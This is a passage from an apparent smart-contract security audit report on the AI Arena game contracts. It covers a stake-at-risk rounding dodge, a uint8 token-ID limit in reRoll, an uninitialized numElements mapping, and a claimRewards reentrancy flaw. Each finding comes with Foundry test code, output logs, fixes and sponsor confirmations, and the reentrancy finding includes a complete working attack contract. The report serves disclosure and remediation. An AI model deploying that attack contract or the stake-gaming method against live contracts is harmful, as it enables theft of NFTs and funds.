=_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0);vm.prank(player);_rankedBattleContract.stakeNRN(1,0);console.log("\n\n==================================== CASE 3 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",1,18);// snapshot the current stateuint256snapshot2_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot2_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,losses) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);}
Output:
==================================== CASE 1 ==========================================================Stats when staked amount =: 4.000000000000000000----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 1500getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 4.000000000000000000_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.004000000000000000_rankedBattleContract NRN balance =: 3.996000000000000000_stakeAtRiskContract NRN balance =: 0.004000000000000000==================================== CASE 2 ==========================================================Stats when staked amount =: 3.999999999999999999----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 750getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 3.999999999999999999_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.003999999999999999_rankedBattleContract NRN balance =: 3.996000000000000000_stakeAtRiskContract NRN balance =: 0.003999999999999999==================================== CASE 3 ==========================================================Stats when staked amount =: 0.000000000000000001----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 750getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 0.000000000000000001_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 0.000000000000000001_stakeAtRiskContract NRN balance =: 0.000000000000000000
Tools used
Foundry
Recommended Mitigation Steps
Protocol can choose to set a minimum stake amount of4 NRN(4e18 wei). One needs to take care that even after a partial unstake, this amount is not allowed to go below4 NRN.Also, do not round upstakingFactor_i.e. removeL530-L532. An additional check can be added too which ensures thatstakingFactor_is greater than zero:
File: src/RankedBattle.sol519:              function _getStakingFactor(520:                  uint256 tokenId,521:                  uint256 stakeAtRisk522:              )523:                  private524:                  view525:                  returns (uint256)526:              {527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18529:                );- 530:                if (stakingFactor_ == 0) {- 531:                  stakingFactor_ = 1;- 532:                }+ 532:                require(stakingFactor_ > 0, "stakingFactor_ = 0");533:                return stakingFactor_;534:              }
The above fixes would ensure thatcurStakeAtRiskcan never be gamed to 0 while still having a positive reward potential.It’s may also be a good idea to have a provision to return any “extra” staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.
raymondfam (lookout) commented:
Strategic dodging to avoid penalty. Might as well fully unstake to make curStakeAtRisk 0. However, points would be zero if at risk penalty were to kick in.
hickuphh3 (judge) increased severity to High

[H-06]FighterFarm::reRollwon’t work for nft id greater than 255 due to input limited to uint8
Submitted byabhishek_thaku_r, also found bypontifex,Fulum,0xDetermination,Greed,givn,stakog,offside0011,maxim371,ktg,alexzoid,immeas,sashik_eth,korok,Draiakoo,MrPotatoMagic,PoeAudits,Tychai0s,ahmedaghadi,kartik_giri_47538,iamandreiski,fnanni,0xAlix2,klau5,dimulski,0xShitgem,yotov721,kiqo, andswizz
FighterFarm::reRolluses uint8 for nft id as input, which will stop people calling this function who owns id greater than 255. It will lead to not being able to use the reRoll to get random traits, which could have been better for there game performance.
Proof of Concept
Affect code can beseen here.
Adding code snippet below as well, for better clarity:
/// @notice Rolls a new fighter with random traits./// @param tokenId ID of the fighter being re-rolled./// @param fighterType The fighter type.@>functionreRoll(uint8tokenId,uint8fighterType)public{require(msg.sender==ownerOf(tokenId));require(numRerolls[tokenId] <maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >=rerollCost,"Not enough NRN for reroll");_neuronInstance.approveSpender(msg.sender,rerollCost);boolsuccess=_neuronInstance.transferFrom(msg.sender,treasuryAddress,rerollCost);if(success) {numRerolls[tokenId] +=1;uint256dna=uint256(keccak256(abi.encode(msg.sender,tokenId,numRerolls[tokenId])));(uint256element,uint256weight,uint256newDna) =_createFighterBase(dna,fighterType);fighters[tokenId].element=element;fighters[tokenId].weight=weight;fighters[tokenId].physicalAttributes=_aiArenaHelperInstance.createPhysicalAttributes(newDna,generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] ="";}}
If you notice the highlighted line (first line of function), it takesuint8as input fortokenIdparameter. Which will restrict users to call this function when they own nft id greater than 255.
Value will go out of bounds when user will input 256 or more.
Recommended Mitigation Steps
Use uint256 for nft id input to fix the issue.
- function reRoll(uint8 tokenId, uint8 fighterType) public {+ function reRoll(uint256 tokenId, uint8 fighterType) public {require(msg.sender == ownerOf(tokenId));require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");_neuronInstance.approveSpender(msg.sender, rerollCost);bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);if (success) {numRerolls[tokenId] += 1;uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));(uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);fighters[tokenId].element = element;fighters[tokenId].weight = weight;fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(newDna,generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] = "";}}
raymondfam (lookout) commented:
Unsigned integer type limitation indeed.
brandinho (AI Arena) confirmed
AI Arena mitigated:
Fixed reRoll for fighters with tokenIds greater than 255.https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/1
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

[H-07] Fighters cannot be minted after the initial generation due to uninitializednumElementsmapping
Submitted byhaxatron, also found byvisualbits,vnavascues,sandy,shaka,alexxander,evmboi32,DarkTower,VAD37,0xStriker, DanielArmstrong (1,2),14si2o_Flint,MidgarAudits,Ryonen,KupiaSec,Topmark,0xmystery,AgileJune,immeas,MrPotatoMagic,sashik_eth,soliditywala,nuthan2x,0xaghas,merlinboii,VrONTg,Krace,ke1caM,Draiakoo,petro_1912,PoeAudits,ktg,0xCiphky,Tychai0s,EagleSecurity,lil_eth,0xvj,_eperezok,pkqs90,pynschon,peter,Aamir,sl1,0xAlix2,fnanni,alexzoid,blutorque,cartlex_,Giorgio,radin100,klau5,t0x1c,WoolCentaur,jesjupyter,aslanbek,SpicyMeatball,0xbranded,Varun_05,d3e4,juancito,0xlamide,Aymen0909,btk,devblixt, andubl4nk
InFighterFarm.solthere is a mappingnumElementswhich stores the number of possible types of elements a fighter can have in a generation:
FighterFarm.sol#L84-L85
/// @notice Mapping of number elements by generation.mapping(uint8=>uint8)publicnumElements;
But the problem here is that only the initial generation, Generation 0, is initialized to 3, in thenumElementsmapping during the constructor ofFighterFarm.sol.
FighterFarm.sol#L100-L111
/// @notice Sets the owner address, the delegated address./// @param ownerAddress Address of contract deployer./// @param delegatedAddress Address of delegated signer for messages./// @param treasuryAddress_ Community treasury address.constructor(addressownerAddress,addressdelegatedAddress,addresstreasuryAddress_)ERC721("AI Arena Fighter","FTR"){_ownerAddress=ownerAddress;_delegatedAddress=delegatedAddress;treasuryAddress=treasuryAddress_;numElements[0] =3;}
It is therefore not possible to write to thenumElementsmapping for any other generations. As they are uninitialized,numElements[i] = 0wheni != 0
Moreover, thisnumElementsmapping is read from when creating a fighter.
FighterFarm.sol#L458-L474
/// @notice Creates the base attributes for the fighter./// @param dna The dna of the fighter./// @param fighterType The type of the fighter./// @return Attributes of the new fighter: element, weight, and dna.function_createFighterBase(uint256dna,uint8fighterType)privateviewreturns(uint256,uint256,uint256){=>uint256element=dna%numElements[generation[fighterType]];// numElements is 0 when generation[fighterType] != 0.uint256weight=dna%31+65;uint256newDna=fighterType==0?dna:uint256(fighterType);return(element,weight,newDna);}
Therefore if the protocol updates to a new generation of fighters, it will not be able to create anymore new fighters asnumElements[generation[fighterType]]will be uninitialized and therefore equal 0. This will cause the transaction to always revert as any modulo by 0 will cause a panicaccording to Solidity Docs
Modulo with zero causes a Panic error. This check can not be disabled through unchecked { … }.
Recommended Mitigation Steps
Allow the admin to update thenumElementsmapping when a new generation is created.
raymondfam (lookout) commented:
MissingnumElements[generation[fighterType]]setter.
brandinho (AI Arena) confirmed
AI Arena mitigated:
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/7
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

[H-08] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on theclaimRewards() function
Submitted byDarkTower, also found byalexxander,0brxce,BoRonGod,0xDetermination,evmboi32,grearlake,PedroZurdo,BARW,sl1,Krace,Zac,Tricko,Aymen0909,immeas,rouhsamad,sashik_eth,ke1caM,0xCiphky,MrPotatoMagic,jnforja,0xBinChook,web3pwn,0xLogos,bhilare_,Kow,ubl4nk,zxriptor,djxploit,solmaxis69,klau5,haxatron, andZanyBonzy
When a fighting round ends, winners for the current round get picked and allocated respective rewards. These rewards are fighter NFTs that can be claimed by such winners. When you claim your rewards for a round or several rounds, thenumRoundsClaimedstate variable which stores the number of rounds you’ve claimed for gets updated to reflect your claim and each winner can only ever claim up to the amounts they win for each given round. That means if you try to batch-claim for two given rounds for which you won 2 fighter NFTs, your NFT count after the claim should be whatever your current balance of NFT is plus 2 fighter NFTs.
The issue here is that there’s a way to mint additional fighter NFTs on top of the fighter NFTs you’re owed for winning even though theclaimRewardsfunction has implemented a decent system to prevent over-claims. For one, it’s relatively complex to spoof a call pretending to be the_mergingPoolAddressto mint but a malicious user doesn’t need to worry too much about that to mint more fighters; they just need to leverage using a smart contract for engineering a simple reentrancy.
Proof of Concept
Consider this call path that allows a malicious user to reach this undesired state:
In-session fight round gets finalized.An admin picks winners for the just finalized round.Alice, one of the winners is entitled to 2 fighter NFTs just like Bob and decides to claim rewards for the rounds she participated in but keep in mind she joined the game with a smart contract.Alice callsclaimRewardssupplying the args(string[] calldata modelURIs, string[] calldata modelTypes, uint256[2][] calldata customAttributes)Those are valid arguments, hence the loop proceeds to make 2 NFT mints to her address.Her address, being a smart contract manages to reenter the call to mint additional NFTs.Alice ends up with more fighter NFTs instead of 2. Bob, who is an EOA gets the 2 NFTs he’s owed but Alice has managed to gain more.
The root cause of this issue stems from theroundId. The amount of times you can reenter theclaimRewardsfunction depends on theroundId. So let’s say theroundIdis 3, it mints 6 NFTs:
First loop mints onceReenter mints the second timeReenter again mints the third timeCannot reenter anymoreControl is released so the call goes back to the second loop & finishes the mintCall goes back & finishes the second and third mintAlice or malicious caller ends up with 6 NFTs instead of 3
Here’s a POC to show one such attack path in the code
Place the code in theMergingPool.t.soltest contract and do the setup:testReenterPOCis the attack POC test
Attack contract:
import"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";contractAttackisIERC721Receiver{addressowner;uint256tickets=0;MergingPoolmergingPool;FighterFarmfighterFarm;constructor(addressmergingPool_,addressfighterFarm_) {mergingPool=MergingPool(mergingPool_);fighterFarm=FighterFarm(fighterFarm_);owner=msg.sender;}functionreenter()internal{++tickets;if(tickets<100) {(string[]memory_modelURIs,string[]memory_modelTypes,uint256[2][]memory_customAttributes) =setInformation();mergingPool.claimRewards(_modelURIs,_modelTypes,_customAttributes);}}functiononERC721Received(address,address,uint256tokenId,bytescalldata)publicreturns(bytes4) {reenter();returnIERC721Receiver.onERC721Received.selector;}functionattack()public{(string[]memory_modelURIs,string[]memory_modelTypes,uint256[2][]memory_customAttributes) =setInformation();mergingPool.claimRewards(_modelURIs,_modelTypes,_customAttributes);}functionsetInformation()publicpurereturns(string[]memory,string[]memory,uint256[2][]memory) {string[]memory_modelURIs=newstring[](3);_modelURIs[0] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";_modelURIs[1] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";_modelURIs[2] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";string[]memory_modelTypes=newstring[](3);_modelTypes[0] ="original";_modelTypes[1] ="original";_modelTypes[2] ="original";uint256[2][]memory_customAttributes=newuint256[2][](3);_customAttributes[0][0] =uint256(1);_customAttributes[0][1] =uint256(80);_customAttributes[1][0] =uint256(1);_customAttributes[1][1] =uint256(80);_customAttributes[2][0] =uint256(1);_customAttributes[2][1] =uint256(80);return(_modelURIs,_modelTypes,_customAttributes);}}functiontestReenterPOC()public{addressBob=makeAddr("Bob");Attackattacker=newAttack(address(_mergingPoolContract),address(_fighterFarmContract));_mintFromMergingPool(address(attacker));_mintFromMergingPool(Bob);assertEq(_fighterFarmContract.ownerOf(0),address(attacker));assertEq(_fighterFarmContract.ownerOf(1),Bob);uint256[]memory_winners=newuint256[](2);_winners[0] =0;_winners[1] =1;// winners of roundId 0 are picked_mergingPoolContract.pickWinner(_winners);assertEq(_mergingPoolContract.isSelectionComplete(0),true);assertEq(_mergingPoolContract.winnerAddresses(0,0) ==address(attacker),true);// winner matches ownerOf tokenIdassertEq(_mergingPoolContract.winnerAddresses(0,1) ==Bob,true);string[]memory_modelURIs=newstring[](2);_modelURIs[0] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";_modelURIs[1] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";string[]memory_modelTypes=newstring[](2);_modelTypes[0] ="original";_modelTypes[1] ="original";uint256[2][]memory_customAttributes=newuint256[2][](2);_customAttributes[0][0] =uint256(1);_customAttributes[0][1] =uint256(80);_customAttributes[1][0] =uint256(1);_customAttributes[1][1] =uint256(80);// winners of roundId 1 are pickeduint256numberOfRounds=_mergingPoolContract.roundId();console.log("Number of Rounds: ",numberOfRounds);_mergingPoolContract.pickWinner(_winners);_mergingPoolContract.pickWinner(_winners);console.log("------------------------------------------------------");console.log("Balance of attacker (Alice) address pre-claim rewards: ",_fighterFarmContract.balanceOf(address(attacker)));// console.log("Balance of Bob address pre-claim rewards: ", _fighterFarmContract.balanceOf(Bob));uint256numRewardsForAttacker=_mergingPoolContract.getUnclaimedRewards(address(attacker));// uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);console.log("------------------------------------------------------");console.log("Number of unclaimed rewards attacker (Alice) address has a claim to: ",numRewardsForAttacker);// console.log("Number of unclaimed rewards Bob address has a claim to: ", numRewardsForBob);// vm.prank(Bob);// _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);vm.prank(address(attacker));attacker.attack();uint256balanceOfAttackerPostClaim=_fighterFarmContract.balanceOf(address(attacker));console.log("------------------------------------------------------");console.log("Balance of attacker (Alice) address post-claim rewards: ",balanceOfAttackerPostClaim);// console.log("Balance of Bob address post-claim rewards: ", _fighterFarmContract.balanceOf(Bob));}
Malicious user leveraging reentrancy test result:
[PASS]testReenterPOC() (gas:3999505)Logs:Number of Rounds:  1------------------------------------------------------Balance of attacker (Alice) address pre-claim rewards:  1------------------------------------------------------Number of unclaimed rewards attacker (Alice) address has a claim to:  3------------------------------------------------------Balance of attacker (Alice) address post-claim rewards:  7Non-malicious users test POC:functiontestNormalEOAClaim()public{_mintFromMergingPool(_ownerAddress);_mintFromMergingPool(_DELEGATED_ADDRESS);assertEq(_fighterFarmContract.ownerOf(0),_ownerAddress);assertEq(_fighterFarmContract.ownerOf(1),_DELEGATED_ADDRESS);uint256[]memory_winners=newuint256[](2);_winners[0] =0;_winners[1] =1;// winners of roundId 0 are picked_mergingPoolContract.pickWinner(_winners);assertEq(_mergingPoolContract.isSelectionComplete(0),true);assertEq(_mergingPoolContract.winnerAddresses(0,0) ==_ownerAddress,true);// winner matches ownerOf tokenIdassertEq(_mergingPoolContract.winnerAddresses(0,1) ==_DELEGATED_ADDRESS,true);string[]memory_modelURIs=newstring[](2);_modelURIs[0] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";_modelURIs[1] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";string[]memory_modelTypes=newstring[](2);_modelTypes[0] ="original";_modelTypes[1] ="original";uint256[2][]memory_customAttributes=newuint256[2][](2);_customAttributes[0][0] =uint256(1);_customAttributes[0][1] =uint256(80);_customAttributes[1][0] =uint256(1);_customAttributes[1][1] =uint256(80);// winners of roundId 1 are pickeduint256numberOfRounds=_mergingPoolContract.roundId();console.log("Number of Rounds: ",numberOfRounds);_mergingPoolContract.pickWinner(_winners);console.log("Balance of owner address pre-claim rewards: ",_fighterFarmContract.balanceOf(address(this)));console.log("Balance of delegated address pre-claim rewards: ",_fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));uint256numRewardsForWinner=_mergingPoolContract.getUnclaimedRewards(_ownerAddress);uint256numRewardsForDelegated=_mergingPoolContract.getUnclaimedRewards(_DELEGATED_ADDRESS);// emit log_uint(numRewardsForWinner);console.log("Number of unclaimed rewards owner address has a claim to: ",numRewardsForWinner);console.log("Number of unclaimed rewards delegated address has a claim to: ",numRewardsForDelegated);// winner claims rewards for previous roundIds_mergingPoolContract.claimRewards(_modelURIs,_modelTypes,_customAttributes);vm.prank(_DELEGATED_ADDRESS);_mergingPoolContract.claimRewards(_modelURIs,_modelTypes,_customAttributes);console.log("Balance of owner address post-claim rewards: ",_fighterFarmContract.balanceOf(address(this)));console.log("Balance of delegated address post-claim rewards: ",_fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));}
Non-malicious users doing a normal claim result:
[PASS]testNormalEOAClaim() (gas:2673123)Logs:Number of Rounds:  1Balance of owner address pre-claim rewards:  1Balance of delegated address pre-claim rewards:  1Number of unclaimed rewards owner address has a claim to:  2Number of unclaimed rewards delegated address has a claim to:  2Balance of owner address post-claim rewards:  3Balance of delegated address post-claim rewards:  3
Recommended Mitigation Steps
Use anonReentrantmodifier for theclaimRewardsfunction.
brandinho (AI Arena) confirmed
AI Arena mitigated:
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/6
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

